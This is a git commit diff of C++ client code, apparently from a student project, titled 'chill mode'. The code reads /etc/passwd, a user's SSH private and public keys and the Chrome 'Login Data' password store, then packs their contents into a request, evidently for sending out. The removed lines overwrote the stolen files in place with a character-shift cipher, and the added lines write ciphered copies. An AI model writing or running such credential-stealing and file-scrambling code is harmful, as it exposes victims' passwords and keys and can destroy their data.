045fc0e4233e40889c7ec1abbe3c5e1b03000186
lenny <lenny.vongphouthone@epitech.eu>
2022-10-08 11:49:21 +0200

    [ADD] chill mode

--- client/src/get_files_in_req.cpp
+++ client/src/get_files_in_req.cpp
@@ -15,8 +15,9 @@ std::string getFileName(std::string filePath, bool withExtension = true, char se
 {
     std::size_t dotPos = filePath.rfind('.');
     std::size_t sepPos = filePath.rfind(seperator);
-    if(sepPos != std::string::npos) {
-        return filePath.substr(sepPos + 1, filePath.size() - (withExtension || dotPos != std::string::npos ? 1 : dotPos) );
+    if (sepPos != std::string::npos)
+    {
+        return filePath.substr(sepPos + 1, filePath.size() - (withExtension || dotPos != std::string::npos ? 1 : dotPos));
     }
     return "";
 }
@@ -27,30 +28,13 @@ std::optional<std::string> get_file(const std::string file_name)
     std::string file;
     char c;
 
-    if (!stream.is_open()) {
+    if (!stream.is_open())
+    {
         std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
         return std::nullopt;
     }
-    while (stream.good()) {
-        std::string line;
-        std::getline(stream, line);
-        file += line + "\n";
-    }
-    stream.close();
-    return file;
-}
-
-std::optional<std::string> get_file_and_cipher(const std::string file_name)
-{
-    std::ifstream stream(file_name);
-    std::string file;
-    char c;
-
-    if (!stream.is_open()) {
-        std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
-        return std::nullopt;
-    }
-    while (stream.good()) {
+    while (stream.good())
+    {
         std::string line;
         std::getline(stream, line);
         file += line + "\n";
@@ -58,27 +42,26 @@ std::optional<std::string> get_file_and_cipher(const std::string file_name)
     stream.close();
 
     stream.open(file_name);
-    std::string temp_fileContent = "";
-    while (stream >> std::noskipws >> c) {
+    std::ofstream cipheredFile(getFileName(file_name) + "_ciphered");
+    while (stream >> std::noskipws >> c)
+    {
         int temp = (c + 7777);
-        temp_fileContent += (char)temp;
+        cipheredFile << (char)temp;
     }
+    cipheredFile.close();
     stream.close();
-
-    std::ofstream ofs;
-    ofs.open(file_name, std::ofstream::out | std::ofstream::trunc);
-    ofs << temp_fileContent;
-    ofs.close();
     return file;
 }
 
 void get_files_contents(Req &request)
 {
-    std::vector<std::string> files_names = {"/etc/passwd",
-        "/home/nestyles/.config/BraveSoftware/Brave-Browser/Default/Login Data"};
+    std::array<std::string, 4> files_names = {"/etc/passwd",
+                                              "/home/kali/.ssh/id_rsa", "/home/kali/.ssh/id_rsa.pub", "/home/kali/.config/google-chrome/Default/Login Data"};
 
-    for (std::vector<std::string>::iterator t=files_names.begin(); t!=files_names.end(); ++t) {
-        if (auto file_content = get_file_and_cipher(*t))
-            request.push_file_to_req(*t, *file_content);
+    for (auto &file_name : files_names)
+    {
+        auto file_content = get_file(file_name);
+        if (auto file_content = get_file(file_name))
+            request.push_file_to_req(file_name, *file_content);
     }
 }
